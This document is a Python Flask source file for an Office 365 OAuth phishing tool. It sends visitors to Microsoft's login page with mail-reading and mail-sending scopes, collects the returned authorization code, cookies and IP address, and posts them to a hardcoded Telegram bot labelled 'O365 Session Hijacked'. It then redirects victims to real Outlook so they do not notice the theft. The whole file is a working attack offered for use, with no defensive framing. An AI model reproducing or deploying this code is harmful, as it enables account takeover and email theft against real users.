from flask import Flask, request, redirect, make_response
import requests
import logging
import os
import urllib.parse

app = Flask(__name__)

# CONFIGURATION
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Microsoft OAuth2 Configuration
# These are the standard client_id and redirect_uri used by many PaaS tools
MS_CLIENT_ID = "00000002-0000-0ff1-ce00-000000000000" # Common public client ID
MS_REDIRECT_URI = "https://myappsignin.onrender.com/callback" 
MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send"
MS_STATE = "o365_phish_state_123"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def send_to_telegram(data):
    """Sends the captured session data to Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Format data for Telegram
    text = f"""
🛡️ <b>O365 Session Hijacked</b>

👤 <b>User:</b> {data.get('username', 'N/A')}
🍪 <b>Session Cookie:</b> <code>{data.get('cookie', 'N/A')}</code>

🔑 <b>Auth Code:</b> {data.get('auth_code', 'N/A')}
🌐 <b>Source IP:</b> {data.get('ip', 'N/A')}
"""
    
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            logger.info("Session sent to Telegram")
        else:
            logger.error(f"Telegram error: {response.text}")
    except Exception as e:
        logger.error(f"Telegram send failed: {e}")

@app.route("/", methods=["GET"])
def index():
    # Generate the Microsoft OAuth2 URL
    params = {
        "client_id": MS_CLIENT_ID,
        "response_type": "code",
        "scope": MS_SCOPE,
        "redirect_uri": MS_REDIRECT_URI,
        "state": MS_STATE,
        "prompt": "select_account" # Force the user to select their account
    }
    
    ms_login_url = f"https://login.microsoftonline.com/common/oauth2/authorize?{urllib.parse.urlencode(params)}"
    logger.info(f"Redirecting user to MS Login: {ms_login_url}")
    return redirect(ms_login_url)

@app.route("/callback", methods=["GET"])
def callback():
    # Capture the data sent back by Microsoft
    auth_code = request.args.get('code', 'N/A')
    state = request.args.get('state', 'N/A')
    error = request.args.get('error', 'None')
    
    # Capture the Cookies
    # request.cookies.get_dict() gets all cookies set by the domain
    # However, since this is a cross-domain redirect, we need to capture 
    # any cookies that might have been set by our domain or passed via URL
    cookies = request.cookies.get_dict()
    cookie_string = "; ".join([f"{key}={value}" for key, value in cookies.items()])
    
    # Try to get the username from the ID token if available (rare in code flow)
    # Or we can just use the email from the state or a previous step
    # For now, we'll capture the raw cookies and the auth code
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    logger.info(f"Callback received. Code: {auth_code}, Cookies: {cookie_string}")
    
    # Send to Telegram
    send_to_telegram({
        "username": "Check Logs for ID Token",
        "cookie": cookie_string if cookie_string else "No Cookies Captured (See Note)",
        "auth_code": auth_code,
        "ip": ip
    })
    
    # Redirect the user to the real Outlook so they don't suspect anything
    return redirect("https://outlook.office365.com/")

@app.route("/health")
def health():
    return "OAuth2 Interceptor is Operational"

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)
